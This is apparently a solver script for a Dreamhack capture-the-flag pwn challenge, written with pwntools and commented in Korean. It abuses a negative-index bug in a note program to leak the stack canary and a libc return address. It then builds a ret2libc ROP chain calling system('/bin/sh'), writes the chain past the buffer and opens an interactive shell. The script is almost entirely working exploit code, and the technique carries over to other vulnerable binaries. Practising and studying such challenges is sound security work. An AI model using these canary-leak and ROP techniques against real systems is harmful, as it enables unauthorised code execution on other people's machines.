from pwn import *

# 취약점 정리
# read_note() : 분명 0~9까지, 10개의 노트만 진입할 수 있게 하는 것 같지만 음수 조건에 대해선 제한을 두지 않음.
# 즉, 음수 인덱스를 읽어올 수 있음. 그리고 0x30 단위로 읽기 때문에 마지막에 널 없으면 최소 0x30 이상으로 출력됨.
# update_note() : 얘도 같음. 근데 덩어리 잘 생각해서 임의 주소 쓰기 해야할듯.
# delete_note() : 얘는 값 지워주기 가능함.
# create_note() 빼고 다 취약점 똑같이 터짐
# memset으로 버퍼 시작부터 0x1e0만큼 0으로 덮었음.
# 그러므로 뒤로 쭉 나오는 게 당연, 따라서 0x1e0은 무시.
# 버퍼가 뒤 카나리와 딱 붙어있음. 그래서 그 뒤 8바이트가 카나리(널 포함)

HOST, PORT = "host8.dreamhack.games 22348".split()

e = ELF('./prob')

context.arch = "amd64"
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def create(size, val):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', val)

def read(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def update(index, size, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
    rop = ROP(libc)
else:
    p = process('./prob')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # in local testing
    rop = ROP(libc)

# for i in range(1, 100):
#     p.sendlineafter(b'> ', b'2')
#     p.sendlineafter(b'index: ', str(i-100).encode())

#for i in range(10): # 0 ~ 9
#    create(0x28, b'A'*0x28)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'size: ', b'1000')

read(0)

p.recvn(0x1e0)
cnry = u64(p.recvn(8))
sfp = u64(p.recvn(8))
ret = u64(p.recvn(8))
#lb = ret - 0x29d90 # vmmap, libc_start_call_main+128
lb = ret - 0x2a1ca

pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
system = lb + libc.sym['system']+27

slog("canary", cnry)
slog("libc_base", lb)
slog("pop_rdi", pop_rdi)
slog("/bin/sh", binsh)
slog("system", system)

pay = b'\x90'*0x8 # nop
pay += p64(cnry)
pay += p64(pop_rdi) + p64(binsh)
pay += p64(system)
update(-2, 40, pay)

# gdb.attach(p,'''
# b *main+392
# c
# ''')
pause()

p.interactive()
